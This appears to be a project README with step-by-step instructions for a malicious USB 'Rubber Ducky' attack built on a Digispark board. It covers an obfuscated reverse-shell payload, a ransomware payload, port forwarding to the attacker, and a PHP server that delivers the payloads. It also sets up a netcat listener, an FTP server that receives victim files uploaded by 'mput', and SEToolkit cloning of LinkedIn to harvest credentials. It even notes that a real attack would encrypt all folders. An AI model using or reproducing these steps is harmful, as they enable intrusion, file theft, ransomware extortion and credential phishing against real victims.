# Instructions for execution the ‘Rubber Ducky’
Malwareob.ps1 - It is the obfuscated payload for reverse shell <br />
Enc2.ps1 - It is the ransomware payload <br />
Malwareproject.ino - the code for the usb
### DYNAMIC DNS
First set up with noip a hostname. <br />
Then configure the router to take the requests in ports 80,443 and 4444 to the attacker IP.
### Install Arduino IDE
1. Install the drivers and the libraries for digispark: <br />
https://github.com/LilyGO/DigiSpark-ATtiny85-driver-install <br />
Follow this to connect libraries: https://digistump.com/wiki/digispark/tutorials/connecting <br />
Try the example at the end to ensure that the usb is working.
2. Upload the code of the malwareproject.ino in the USB <br />

Before that you should set up the attacker.
### Attacker
1. Open a cmd create a folder and then insert the payloads of the reverse shell and the
ransomware. <br />
Start the server running sudo php -S 0.0.0.0:443 –t /directory/to/folder/of/powershellScript/ (in our
case the path is /home/kali/sofia/)
2. Open a cmd and install ftp: <br />
>sudo apt-get install vsftpd <br />
>sudo nano /etc/vsftpd.conf <br />
>write_enable=YES <br />
>sudo chown -R kali /var/www/html <br />
>sudo chmod 757 -R /var/www/html <br />
>service vsftpd start 
3. In another cmd write nc –lp 4444 to set the netcat listening to that port.
4. The last cmd, “set setoolkit” <br />
We select the option 1,2,3 then we put our public IP of the dynamic dns and for cloning linkedin.com <br />
For the testing purposes we put in the enc2 file a specific path to encrypt, to test it change this path with
one you would like. In a real case scenario, we will do it for all folders. <br />
Change the paths: <br />
  >1. $path= get-childitem -path "C:\Users\pc\Desktop\Lourdes\test\*" <br />
  >2. echo "mput C:\Users\pc\Desktop\Lourdes\test\*.*" >> $home\ft1.txt
